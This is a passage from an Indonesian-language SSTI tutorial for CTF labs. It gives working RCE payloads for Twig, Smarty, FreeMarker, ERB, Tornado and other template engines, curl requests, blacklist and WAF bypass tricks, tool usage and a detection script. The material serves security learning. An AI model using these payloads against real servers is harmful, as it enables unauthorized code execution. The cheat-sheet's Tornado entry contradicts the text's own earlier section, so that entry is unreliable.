  --data-urlencode 'q={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
```

Expected pada environment vulnerable:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Mengapa Payload Bisa Gagal?

Kemungkinan:

```text
Twig terlalu baru
registerUndefinedFilterCallback tidak tersedia
Sandbox aktif
Method disembunyikan
Function tidak tersedia
Application menggunakan custom environment
```

---

# 3.4 Twig Filter Bypass

### ðŸ“Œ Kapan Digunakan

Gunakan ketika Twig teridentifikasi tetapi primitive klasik tidak tersedia.

---

Investigasi:

```text
_self
 â†“
environment
 â†“
available filters
 â†“
available functions
 â†“
sandbox
```

Cari:

```text
UndefinedFilter
UndefinedFunction
SandboxSecurityError
```

Jangan menganggap semua instalasi Twig memiliki:

```text
exec
system
passthru
shell_exec
```

---

# Bagian 4 â€” Smarty (PHP)

# 4.1 Smarty Detection

### ðŸ“Œ Kapan Digunakan

Gunakan ketika syntax Jinja/Twig tidak bekerja tetapi expression dengan single braces dievaluasi.

Smarty sering menggunakan:

```smarty
{7*7}
```

Expected:

```text
49
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={7*7}'
```

Expected:

```text
49
```

Petunjuk error:

```text
SmartyException
Smarty_Internal_Template
```

---

# 4.2 Smarty RCE

### ðŸ“Œ Kapan Digunakan

Gunakan hanya pada CTF/lab dengan Smarty configuration yang mengizinkan PHP/system functionality.

Payload klasik yang sering digunakan dalam challenge:

```smarty
{system("id")}
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={system("id")}'
```

---

## Alternative

Pada environment tertentu:

```smarty
{exec("id")}
```

atau primitive PHP lain mungkin tersedia, tetapi availability bergantung:

```text
PHP configuration
Smarty security policy
Smarty version
Registered functions
```

Jangan menganggap payload lama universal.

---

# Bagian 5 â€” Freemarker (Java)

# 5.1 Freemarker Detection

### ðŸ“Œ Kapan Digunakan

Gunakan ketika target Java menggunakan FreeMarker atau `${...}` menghasilkan evaluation.

Payload:

```freemarker
${7*7}
```

Expected:

```text
49
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=${7*7}'
```

---

## Error

Cari:

```text
freemarker.core.ParseException
freemarker.core.InvalidReferenceException
```

---

# 5.2 Freemarker RCE

### ðŸ“Œ Kapan Digunakan

Gunakan pada challenge yang memberikan FreeMarker execution dan memungkinkan Java utility classes.

Primitive klasik:

```text
freemarker.template.utility.Execute
```

---

## Konsep

```text
Freemarker template
       |
       v
new()
       |
       v
Execute class
       |
       v
OS command
```

Payload klasik:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

Expected:

```text
uid=1000(app) gid=1000(app) groups=1000(app)
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
```

---

## Tahapan

```text
1. Confirm ${7*7}
2. Test FreeMarker directive
3. Test ?new
4. Attempt Execute class
5. Execute id
6. Validate context
```

---

## Mengapa Bisa Gagal?

```text
Class disabled
Object wrapper restricted
Sandbox/security policy
Configuration blocks ?new
Custom TemplateClassResolver
Modern hardening
```

---

# 5.3 Freemarker Information Disclosure

### ðŸ“Œ Kapan Digunakan

Gunakan ketika ingin mengetahui data model yang tersedia sebelum melakukan exploitation lebih jauh.

Payload:

```freemarker
${.data_model}
```

Contoh output:

```text
{user=admin, account=..., environment=...}
```

Data model sangat berguna untuk:

```text
application context
objects
variables
configuration clues
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=${.data_model}'
```

---

# Bagian 6 â€” Velocity (Java)

# 6.1 Velocity Detection

### ðŸ“Œ Kapan Digunakan

Gunakan ketika Java target tidak cocok dengan Freemarker tetapi syntax `#set`, `$variable`, atau package Velocity muncul.

Payload:

```velocity
#set($x = 7*7)$x
```

Expected:

```text
49
```

Jika parser memerlukan formatting:

```velocity
#set($x = 7*7)
$x
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=#set($x=7*7)$x'
```

Expected:

```text
49
```

---

# 6.2 Velocity RCE

### ðŸ“Œ Kapan Digunakan

Gunakan pada Velocity CTF/lab ketika class instantiation atau reflection primitive tersedia.

Salah satu pola klasik adalah mendapatkan akses ke class/runtime menggunakan object yang diekspos oleh template.

Contoh pendekatan challenge-oriented:

```velocity
#set($runtime = $class.inspect("java.lang.Runtime").getRuntime())
$runtime.exec("id")
```

Namun ini sangat bergantung pada:

```text
Velocity version
Secure Uberspector
Reflection restrictions
Context objects
Application configuration
```

Pada environment tertentu, teknik berbasis:

```text
$e
$class
inspect()
```

digunakan sebagai class-loading/reflection primitive.

---

## Concept Flow

```text
Velocity expression
      |
      v
$class / available object
      |
      v
Java class lookup
      |
      v
Runtime
      |
      v
exec("id")
```

---

# Bagian 7 â€” Handlebars (Node.js)

# 7.1 Handlebars Detection

### ðŸ“Œ Kapan Digunakan

Gunakan ketika Node.js terlihat tetapi:

```text
{{7*7}}
```

tidak dihitung.

Handlebars secara normal tidak bertindak sebagai arithmetic expression evaluator.

Payload:

```handlebars
{{7*7}}
```

Expected pada konfigurasi normal:

```text
7*7
```

atau literal:

```text
{{7*7}}
```

tergantung context.

Ini penting karena:

```text
{{...}}
```

tidak otomatis berarti Jinja2.

---

## Escape by Default

Handlebars umumnya melakukan HTML escaping:

```handlebars
{{name}}
```

berbeda dengan raw rendering:

```handlebars
{{{name}}}
```

Tetapi ini adalah isu escaping, bukan otomatis SSTI.

---

# 7.2 Handlebars SSTI

### ðŸ“Œ Kapan Digunakan

Gunakan ketika aplikasi benar-benar mengompilasi atau menyusun template berdasarkan input user dan prototype-related primitives masih dapat dicapai.

---

## Mental Model

```text
Handlebars
   |
   v
Template helper/prototype behavior
   |
   v
Object property
   |
   v
constructor
   |
   v
Function
   |
   v
Potential code execution
```

---

## Constructor Chain

Konsep:

```text
object
 â†“
constructor
 â†“
constructor
 â†“
Function
```

Contoh payload chain yang sering dijumpai pada vulnerable/older configurations menggunakan helper traversal.

Contoh pola:

```handlebars
{{lookup this "constructor"}}
```

atau bentuk prototype traversal lainnya.

Payload RCE Handlebars sangat bergantung pada:

```text
Handlebars version
Prototype access restrictions
AllowedProtoMethods
AllowedProtoProperties
Custom helpers
Runtime configuration
```

---

## Defensive Configuration Matters

Pada environment modern, pesan error dapat berupa:

```text
Access has been denied to resolve the property "constructor"
```

Ini justru menjadi fingerprint yang berguna.

---

## Jangan Salah Diagnosis

```text
{{7*7}}
```

â†’ literal

bukan berarti:

```text
Handlebars 100%
```

Gunakan:

```text
Node.js fingerprint
+
Handlebars error
+
helper behavior
+
package/version
```

---

# Bagian 8 â€” ERB (Ruby)

# 8.1 ERB Detection

### ðŸ“Œ Kapan Digunakan

Gunakan ketika target memakai Ruby/Rails atau syntax `<%= %>` teridentifikasi.

Payload:

```erb
<%= 7*7 %>
```

Expected:

```text
49
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=<%= 7*7 %>'
```

---

## Fingerprint

Cari:

```text
Ruby
Rails
ActionView
ERB
```

Error:

```text
SyntaxError
```

atau Rails stack trace.

---

# 8.2 ERB RCE

### ðŸ“Œ Kapan Digunakan

Gunakan hanya pada CTF/lab. ERB secara desain dapat mengevaluasi Ruby sehingga SSTI dapat sangat dekat dengan RCE.

---

## Payload 1

```erb
<%= system("id") %>
```

Expected:

```text
true
```

Perhatikan:

```text
system()
```

mengembalikan status boolean, bukan stdout command.

---

## Payload 2

```erb
<%= `id` %>
```

Expected:

```text
uid=1000(app) gid=1000(app) groups=1000(app)
```

---

## curl

```bash
# GET request dengan parameter q
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=<%= system("id") %>'

# Atau POST request
curl -s 'http://10.10.10.10/search' \
  -X POST \
  --data-urlencode 'q=<%= system("id") %>'

# Untuk mendapat output, gunakan backticks
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=<%= `id` %>'
```

> **Note:** `--data-urlencode` membutuhkan **nama parameter** (seperti `q=`) sebelum payload. Tanpa nama parameter, request akan gagal.

atau parameter:

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q=<%= `id` %>'
```

---

# Bagian 9 â€” Tornado (Python)

# 9.1 Tornado Detection

### ðŸ“Œ Kapan Digunakan

Gunakan ketika target merupakan Python application yang memakai Tornado templates.

Payload:

```jinja2
{{7*7}}
```

Expected:

```text
49
```

Tornado menggunakan syntax yang memiliki kemiripan dengan beberapa Python template engines, sehingga framework fingerprint penting.

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={{7*7}}'
```

---

## Discriminator

Cari:

```text
tornado
RequestHandler
tornado.web
```

atau stack trace Python yang mengarah ke Tornado.

---

# 9.2 Tornado RCE

### ðŸ“Œ Kapan Digunakan

Gunakan pada Tornado template lab ketika template directives dapat mengakses import/module functionality.

### Payload yang Lebih Reliable

**âš ï¸ PENTING:** Tornado **TIDAK** menggunakan syntax `{% import os %}` seperti Jinja2. Tornado mendukung Python expressions langsung dalam `{{ }}`.

Payload yang **benar** dan **reliable** di Tornado CTF:

```tornado
{{ __import__('os').popen('id').read() }}
```

Expected:

```text
uid=1000(app) gid=1000(app) groups=1000(app)
```

### Alternatif via subprocess

```tornado
{{ __import__('subprocess').check_output('id', shell=True).decode() }}
```

---

## curl â€” Recommended

```bash
# Payload 1: via os.popen (RECOMMENDED)
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{ __import__('os').popen('id').read() }}"

# Payload 2: via subprocess
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{ __import__('subprocess').check_output('id',shell=True).decode() }}"
```

---

## Output Bisa Berupa Return Code

`os.system()` dapat menghasilkan numeric return code:

```text
0
```

sedangkan command output mungkin tercetak di server stdout, bukan selalu ke HTTP response.

Untuk CTF, ini penting:

```text
RCE â‰  stdout visible
```

**Gunakan `popen().read()` atau `check_output()` untuk mendapat output di response.**

---

# Bagian 9.3 â€” Pebble Engine (Java) â€” Not Covered

### âš ï¸ Catatan Penting

**Pebble** adalah template engine untuk Java yang jarang muncul di CTF environment. File ini **tidak membahas Pebble secara detail** karena:

1. **Jarang digunakan** di HackTheBox, TryHackMe, dan PortSwigger labs
2. **Java SSTI** lebih sering menggunakan Freemarker atau Velocity
3. **Detection** Pebble mirip dengan Jinja2/Twig (`{{7*7}}` â†’ `49`), sehingga sering tertukar

### Jika Menemukan Pebble

Jika kamu yakin target menggunakan Pebble (dari error message atau framework detection), referensi:

- [Pebble Official Docs](https://pebbletemplates.io/)
- [PayloadsAllTheThings â€” Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pebble)

Untuk CTF, **prioritaskan Jinja2, Twig, Freemarker, dan Velocity** terlebih dahulu.

---

# Bagian 10 â€” SSTI to RCE Cheatsheet

> **MASTER QUICK REFERENCE**

|Engine|Detection|RCE Payload|Notes|
|---|---|---|---|
|**Jinja2**|`{{7*7}}` â†’ `49`|`{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}`|Index berbeda per environment|
|**Jinja2**|`{{7*'7'}}` â†’ `7777777`|`{{cycler.__init__.__globals__.os.popen('id').read()}}`|Context/version dependent|
|**Twig**|`{{7*7}}` â†’ `49`|`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`|Classic technique; modern Twig may block it|
|**Smarty**|`{7*7}` â†’ `49`|`{system("id")}`|Configuration/version dependent|
|**Freemarker**|`${7*7}` â†’ `49`|`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`|Security policy may block|
|**Velocity**|`#set($x=7*7)$x` â†’ `49`|Reflection/runtime technique|Highly configuration dependent|
|**Handlebars**|`{{7*7}}` usually literal|Prototype/constructor chain|Strongly version/configuration dependent|
|**ERB**|`<%=7*7%>` â†’ `49`|`<%= \`id` %>`|Ruby code execution|
|**Tornado**|`{{7*7}}` â†’ `49`|`{% import os %}{{os.system("id")}}`|Command output may not appear in HTTP|

---

## Priority Table

```text
Jinja2
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  Very common in CTF

Twig
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ       Common

Freemarker
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ         Common in Java labs

ERB
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ           Common in Ruby labs

Smarty
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ             PHP legacy/common labs

Velocity
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ               Java legacy labs

Tornado
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                Python-specific

Handlebars
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                Node-specific
```

---

# Bagian 11 â€” Tools & Automation

# 11.1 tplmap

### ðŸ“Œ Kapan Digunakan

Gunakan `tplmap` ketika manual detection sudah menunjukkan kemungkinan SSTI dan kamu ingin mengotomasi fingerprinting/exploitation pada lab.

---

## Install

Pada Parrot OS:

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Jika dependency legacy bermasalah, jangan langsung merusak system Python. Gunakan virtual environment.

---

## Basic Usage

Contoh konsep:

```bash
python3 tplmap.py -u 'http://10.10.10.10/?name=INJECT'
```

Parameter yang diuji harus memang berada pada endpoint yang menerima input.

---

## POST

```bash
python3 tplmap.py \
  -u 'http://10.10.10.10/search' \
  --data 'q=INJECT'
```

---

## Output Interpretation

Perhatikan:

```text
[+] SSTI detected
[+] Engine identified
[+] Injection point
[+] Available functionality
```

Jangan hanya membaca:

```text
Potential SSTI
```

Konfirmasi manual tetap penting.

---

# 11.2 SSTImap

### ðŸ“Œ Kapan Digunakan

Gunakan SSTImap sebagai alternatif modern untuk automated SSTI detection dan exploitation testing pada lab.

---

## Install

Contoh:

```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

---

## Basic Usage

Contoh umum:

```bash
python3 sstimap.py -u 'http://10.10.10.10/?q=INJECT'
```

Untuk POST:

```bash
python3 sstimap.py \
  -u 'http://10.10.10.10/search' \
  --data 'q=INJECT'
```

---

## tplmap vs SSTImap

|Feature|tplmap|SSTImap|
|---|---|---|
|SSTI detection|Ya|Ya|
|Engine identification|Ya|Ya|
|Automation|Ya|Ya|
|Legacy ecosystem|Lebih kuat|Lebih modern|
|Lab exploitation|Ya|Ya|
|Manual confirmation|Tetap diperlukan|Tetap diperlukan|

Tool automation:

```text
accelerates testing
```

bukan:

```text
replaces understanding
```

---

# 11.3 Manual Testing dengan curl

### ðŸ“Œ Kapan Digunakan

Gunakan `curl` untuk menguji satu payload secara cepat tanpa membuka browser/Burp.

---

## GET Parameter

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={{7*7}}'
```

---

## POST Parameter

```bash
curl -s 'http://10.10.10.10/search' \
  -X POST \
  --data-urlencode 'q={{7*7}}'
```

---

## Header

```bash
curl -s 'http://10.10.10.10/' \
  -H 'User-Agent: {{7*7}}'
```

---

## Multiple Headers

```bash
curl -s 'http://10.10.10.10/' \
  -H 'User-Agent: {{7*7}}' \
  -H 'Referer: ${7*7}'
```

---

## URL Encoding

Original:

```text
{{7*7}}
```

Encoded:

```text
%7B%7B7%2A7%7D%7D
```

Manual:

```bash
curl 'http://10.10.10.10/search?q=%7B%7B7%2A7%7D%7D'
```

Lebih aman menggunakan:

```bash
curl -G \
  --data-urlencode 'q={{7*7}}' \
  'http://10.10.10.10/search'
```

karena `curl` menangani encoding.

---

# 11.4 Burp Suite untuk SSTI

### ðŸ“Œ Kapan Digunakan

Gunakan Burp ketika endpoint mempunyai banyak parameter atau kamu perlu membandingkan response secara cepat.

---

## Repeater Workflow

```text
Capture Request
      |
      v
Send to Repeater
      |
      v
Baseline
      |
      v
{{7*7}}
      |
      v
Compare Response
      |
      v
{{7*'7'}}
      |
      v
Engine Identification
      |
      v
Information Disclosure
      |
      v
RCE validation
```

---

## Baseline

```http
GET /search?q=hello HTTP/1.1
Host: target.htb
```

Catat:

```text
Status
Length
Reflection
Response body
Headers
Timing
```

---

## Test 1

```http
GET /search?q={{7*7}} HTTP/1.1
Host: target.htb
```

---

## Test 2

```http
GET /search?q={{7*%277%27}} HTTP/1.1
Host: target.htb
```

Bandingkan.

---

## Intruder

Gunakan Intruder untuk detection payload:

```text
{{7*7}}
{{7+7}}
${7*7}
{7*7}
<%=7*7%>
#set($x=7*7)$x
```

Perhatikan:

```text
HTTP status
response length
body diff
keyword
latency
```

Jangan langsung memasukkan ratusan RCE payload.

Urutan lebih efisien:

```text
Detection first
Fingerprint second
Exploit third
```

---

# 11.5 Script `ssti_detect.sh`

### ðŸ“Œ Kapan Digunakan

Gunakan script ini untuk melakukan **detection/fingerprinting otomatis** terhadap satu GET parameter. Script sengaja tidak menjalankan OS command; tahap RCE tetap manual dalam lab.

## Script

```bash
#!/usr/bin/env bash

set -uo pipefail

usage() {
    cat <<'EOF'
Usage:
  ./ssti_detect.sh <URL> <PARAMETER>

Example:
  ./ssti_detect.sh 'http://10.10.10.10/search' 'q'

The script tests a GET parameter using SSTI detection payloads.
EOF
}

# -----------------------------
# Input validation
# -----------------------------

if [[ $# -ne 2 ]]; then
    echo "[!] Invalid number of arguments." >&2
    usage
    exit 1
fi

URL="$1"
PARAM="$2"

# Basic URL validation
if [[ ! "$URL" =~ ^https?://[^[:space:]]+$ ]]; then
    echo "[!] Invalid URL: $URL" >&2
    exit 1
fi

# Reject dangerous shell metacharacters in parameter name.
# Parameter names normally contain alphanumeric, _, -, [, ], and .
if [[ ! "$PARAM" =~ ^[A-Za-z0-9_.\[\]-]+$ ]]; then
    echo "[!] Invalid parameter name: $PARAM" >&2
    exit 1
fi

# Require curl
if ! command -v curl >/dev/null 2>&1; then
    echo "[!] curl is required." >&2
    exit 1
fi

# Temporary directory
TMPDIR="$(mktemp -d)"
trap 'rm -rf "$TMPDIR"' EXIT

# -----------------------------
# Detection function
# -----------------------------

test_payload() {
    local engine="$1"
    local payload="$2"
    local outfile="$TMPDIR/response"

    echo
    echo "[-] Testing: $engine"
    echo "    Payload: $payload"

    if ! curl \
        --silent \
        --show-error \
        --max-time 10 \
        --get \
        --data-urlencode "${PARAM}=${payload}" \
        "$URL" \
        >"$outfile"; then
        echo "    [!] Request failed"
        return
    fi

    local response
    response="$(cat "$outfile")"

    # Exact/strong indicators
    if grep -Fq "49" "$outfile"; then
        echo "    [+] Possible $engine detected"
    fi

    case "$engine" in
        "Jinja2")
            if grep -Fq "7777777" "$outfile"; then
                echo "    [+] Strong Jinja2 indicator"
            fi
            if grep -Eqi "jinja2|werkzeug|flask" "$outfile"; then
                echo "    [+] Jinja2/Flask-related error indicator"
            fi
            ;;

        "Twig")
            if grep -Eqi "Twig\\\\|Twig/|twig" "$outfile"; then
                echo "    [+] Twig-related indicator"
            fi
            ;;

        "Smarty")
            if grep -Eqi "Smarty|smarty_internal" "$outfile"; then
                echo "    [+] Smarty-related indicator"
            fi
            ;;

        "Freemarker")
            if grep -Eqi "freemarker|ParseException|InvalidReferenceException" "$outfile"; then
                echo "    [+] FreeMarker-related indicator"
            fi
            ;;

        "Velocity")
            if grep -Eqi "velocity|org\.apache\.velocity" "$outfile"; then
                echo "    [+] Velocity-related indicator"
            fi
            ;;

        "ERB")
            if grep -Eqi "ruby|rails|erb|actionview" "$outfile"; then
                echo "    [+] Ruby/ERB-related indicator"
            fi
            ;;

        "Tornado")
            if grep -Eqi "tornado|requesthandler" "$outfile"; then
                echo "    [+] Tornado-related indicator"
            fi
            ;;

        "Handlebars")
            if grep -Eqi "handlebars|prototype|constructor" "$outfile"; then
                echo "    [+] Handlebars-related indicator"
            fi
            ;;
    esac

    # Show a small response sample
    echo "$response" | head -c 220 | tr '
' ' '
    echo
}

# -----------------------------
# Main detection set
# -----------------------------

echo "=============================================="
echo " SSTI Detection Scanner"
echo "=============================================="
echo "[+] Target: $URL"
echo "[+] Parameter: $PARAM"
echo

test_payload "Jinja2/Twig/Tornado/Pebble" '{{7*7}}'
test_payload "Jinja2 discriminator" "{{7*'7'}}"
test_payload "Smarty" '{7*7}'
test_payload "Freemarker" '${7*7}'
test_payload "ERB" '<%= 7*7 %>'
test_payload "Velocity" '#set($x=7*7)$x'
test_payload "Handlebars" '{{7*7}}'

echo
echo "=============================================="
echo " Detection complete"
echo "=============================================="
echo "[!] Confirm candidates manually."
echo "[!] A numeric result alone is not proof of engine identity."
```

---

## Membuat Executable

```bash
chmod +x ssti_detect.sh
```

---

## Menjalankan

```bash
./ssti_detect.sh \
  'http://10.10.10.10/search' \
  'q'
```

---

## Contoh Output Realistis

```text
==============================================
 SSTI Detection Scanner
==============================================
[+] Target: http://10.10.10.10/search
[+] Parameter: q


[-] Testing: Jinja2/Twig/Tornado/Pebble
    Payload: {{7*7}}
    [+] Possible Jinja2/Twig/Tornado/Pebble detected
    Search result: 49

[-] Testing: Jinja2 discriminator
    Payload: {{7*'7'}}
    [+] Strong Jinja2 indicator
    Search result: 7777777

[-] Testing: Smarty
    Payload: {7*7}
    Search result: {7*7}

[-] Testing: Freemarker
    Payload: ${7*7}
    Search result: ${7*7}

[-] Testing: ERB
    Payload: <%= 7*7 %>
    Search result: <%= 7*7 %>

[-] Testing: Velocity
    Payload: #set($x=7*7)$x
    Search result: #set($x=7*7)$x

[-] Testing: Handlebars
    Payload: {{7*7}}
    [+] Possible Handlebars detected
    Search result: 49

==============================================
 Detection complete
==============================================
[!] Confirm candidates manually.
[!] A numeric result alone is not proof of engine identity.
```

### Penting

Output di atas sengaja menunjukkan bahwa automation dapat menghasilkan:

```text
false positive
```

Contoh:

```text
{{7*7}} â†’ 49
```

dapat cocok terhadap beberapa engine.

Karena itu workflow sebenarnya:

```text
Scanner
 â†“
Candidate
 â†“
Manual discriminator
 â†“
Stack trace
 â†“
Framework fingerprint
 â†“
Confirmed engine
```

---

# Bagian 12 â€” SSTI Filter Bypass

# 12.1 Encoding Bypass

### ðŸ“Œ Kapan Digunakan

Gunakan ketika input filter/WAF mengubah atau menolak karakter tertentu tetapi parser template masih mungkin menerima representasi encoded.

---

## URL Encoding

Payload:

```text
{{7*7}}
```

menjadi:

```text
%7B%7B7%2A7%7D%7D
```

curl:

```bash
curl 'http://10.10.10.10/search?q=%7B%7B7%2A7%7D%7D'
```

Lebih aman:

```bash
curl -G \
  --data-urlencode 'q={{7*7}}' \
  'http://10.10.10.10/search'
```

---

## Unicode

Beberapa aplikasi memiliki perbedaan antara:

```text
raw input
normalized input
template parser input
```

Eksperimen dapat dilakukan dengan karakter Unicode yang kemudian dinormalisasi oleh application layer.

Namun:

```text
Unicode equivalent
```

tidak selalu berarti:

```text
same parser token
```

---

## Hex Encoding

Hex dapat relevan ketika data melewati:

```text
URL decoder
application decoder
string parser
```

Tetapi jangan menganggap:

```text
hex string
```

otomatis menjadi:

```text
template syntax
```

Tanpa decoding stage di server, ia hanya tetap menjadi string.

---

# 12.2 String Concatenation Bypass

### ðŸ“Œ Kapan Digunakan

Gunakan ketika blacklist mencari keyword lengkap seperti:

```text
class
config
subclasses
os
system
```

---

## Jinja2

Contoh:

```jinja2
{{'cla' ~ 'ss'}}
```

Expected:

```text
class
```

Contoh underscore splitting:

```jinja2
{{'__' ~ 'class' ~ '__'}}
```

---

## Tujuan

Bukan:

```text
generate text
```

saja.

Tujuannya adalah:

```text
generate token dynamically
```

kemudian gunakan token tersebut sebagai attribute/lookup bila engine mengizinkan.

---

## Contoh Mental Model

```text
Filter sees:

cla + ss

Server sees after evaluation:

class
```

---

# 12.3 Attribute Access Bypass

### ðŸ“Œ Kapan Digunakan

Gunakan ketika:

```text
object.attribute
```

diblokir.

---

## Dot Notation

Normal:

```jinja2
{{request.args}}
```

---

## `attr()`

Alternatif:

```jinja2
{{request|attr('args')}}
```

---

## Item Access

Normal:

```jinja2
{{request['args']}}
```

Alternatif concept:

```jinja2
{{request.__getitem__('args')}}
```

---

## Prinsip

```text
Blocked syntax
     |
     v
Alternative parser primitive
     |
     v
same object
```

---

# 12.4 Blacklist Bypass

### ðŸ“Œ Kapan Digunakan

Gunakan ketika filter hanya melakukan substring matching.

Contoh blacklist:

```text
class
__
.
[
]
config
os
```

---

## `request.args` Trick

Dalam Flask context, parameter lain dapat menjadi sumber string/data.

Misalnya:

```http
GET /search?q=PAYLOAD&x=VALUE
```

Kemudian template dapat mengakses:

```text
request.args
```

Konsep:

```text
Blacklist blocks keyword in q
      |
      v
Keyword comes from another request parameter
      |
      v
Template evaluates it
```

Ini adalah alasan blacklist:

```text
string matching
```

tidak sama dengan:

```text
security boundary
```

---

## Config Trick

Jika `config` tersedia:

```jinja2
{{config}}
```

gunakan object configuration sebagai alternate source terhadap informasi yang dibutuhkan.

Yang penting untuk dipahami:

```text
Blacklist â‰  sandbox
```

---

# Bagian 13 â€” Context Injection

# 13.1 SSTI dalam HTML Context

### ðŸ“Œ Kapan Digunakan

Gunakan ketika input dimasukkan ke halaman HTML melalui server-side template rendering.

Contoh template:

```html
<h1>Hello {{ name }}</h1>
```

Payload:

```text
{{7*7}}
```

Request:

```bash
curl -sG 'http://10.10.10.10/profile' \
  --data-urlencode 'name={{7*7}}'
```

Expected:

```html
<h1>Hello 49</h1>
```

---

# 13.2 SSTI dalam URL Parameter

### ðŸ“Œ Kapan Digunakan

Ini biasanya entry point paling mudah karena GET parameter langsung terlihat.

Contoh:

```http
GET /search?q={{7*7}}
```

curl:

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={{7*7}}'
```

---

## POST Body

```bash
curl -s \
  -X POST \
  --data-urlencode 'q={{7*7}}' \
  'http://10.10.10.10/search'
```

Untuk JSON:

```bash
curl -s \
  -H 'Content-Type: application/json' \
  -d '{"q":"{{7*7}}"}' \
  'http://10.10.10.10/api/search'
```

---

# 13.3 SSTI dalam Header

### ðŸ“Œ Kapan Digunakan

Gunakan ketika server memasukkan header ke template, misalnya:

```text
User-Agent
Referer
X-Forwarded-For
Custom headers
```

---

## User-Agent

```bash
curl -s \
  -H 'User-Agent: {{7*7}}' \
  'http://10.10.10.10/'
```

---

## Referer

```bash
curl -s \
  -H 'Referer: {{7*7}}' \
  'http://10.10.10.10/'
```

---

## Custom Header

```bash
curl -s \
  -H 'X-Test: {{7*7}}' \
  'http://10.10.10.10/'
```

---

## Mental Model

```text
HTTP Header
    |
    v
Application reads header
    |
    v
Template construction
    |
    v
Template Engine
    |
    v
SSTI
```

---

# 13.4 SSTI dalam File Name/Upload

### ðŸ“Œ Kapan Digunakan

Gunakan ketika application processing membuat template dari:

```text
filename
template name
uploaded content
generated HTML
email template
report name
```

Contoh filename:

```text
{{7*7}}.txt
```

Jika application menggunakan nama tersebut sebagai template content/path secara unsafe, hasilnya dapat menjadi indikasi SSTI/template processing.

---

## Contoh Upload

```bash
curl -s \
  -F 'file=@{{7*7}}.txt' \
  'http://10.10.10.10/upload'
```

Tetapi perlu dibedakan:

```text
filename reflection
```

vs:

```text
filename template execution
```

Nama file yang hanya ditampilkan sebagai string bukan SSTI.

---

# Bagian 14 â€” Decision Tree

## Master SSTI Decision Tree

```text
                     INPUT FIELD
                         |
                         v
              +----------------------+
              | Input direfleksikan? |
              +----------------------+
                         |
                       YES
                         |
                         v
                  {{7*7}}
                         |
             +-----------+-----------+
             |                       |
             v                       v
            49                    literal
             |                       |
             v                       v
     +----------------+       Test alternative
     | {{7*'7'}}      |       syntaxes
     +----------------+
             |
       +-----+-----+
       |           |
       v           v
  7777777         49
       |           |
       v           v
    Jinja2       Twig candidate
       |
       v
  Confirm with:
  config/request/errors
       |
       v
  Jinja2 CONFIRMED


If {{7*7}} is literal:

             ${7*7}
                |
        +-------+-------+
        |               |
        v               v
       49            literal
        |
        v
   Freemarker
        |
        v
     confirm


             {7*7}
                |
        +-------+-------+
        |               |
        v               v
       49            literal
        |
        v
     Smarty


             <%=7*7%>
                |
        +-------+-------+
        |               |
        v               v
       49            literal
        |
        v
       ERB


             #set($x=7*7)$x
                         |
                 +-------+-------+
                 |               |
                 v               v
                49            literal
                 |
                 v
              Velocity


             {{7*7}}
                 |
             literal
                 |
                 v
       Node.js fingerprint?
                 |
                 v
             Handlebars
                 |
                 v
      Check helpers/prototype


             {{7*7}} = 49
                 |
                 v
         Python fingerprint?
                 |
            +----+----+
            |         |
            v         v
          Flask    Tornado
            |         |
          Jinja2   Tornado


ERROR RESPONSE
      |
      v
+-----------------------------+
| Read error / stack trace    |
+-----------------------------+
      |
      +-- jinja2.exceptions.* â†’ Jinja2
      |
      +-- Twig\Error\* â†’ Twig
      |
      +-- Smarty* â†’ Smarty
      |
      +-- freemarker.* â†’ Freemarker
      |
      +-- org.apache.velocity â†’ Velocity
      |
      +-- Ruby/ERB/ActionView â†’ ERB
      |
      +-- tornado.* â†’ Tornado
      |
      +-- Handlebars/prototype â†’ Handlebars
```

---

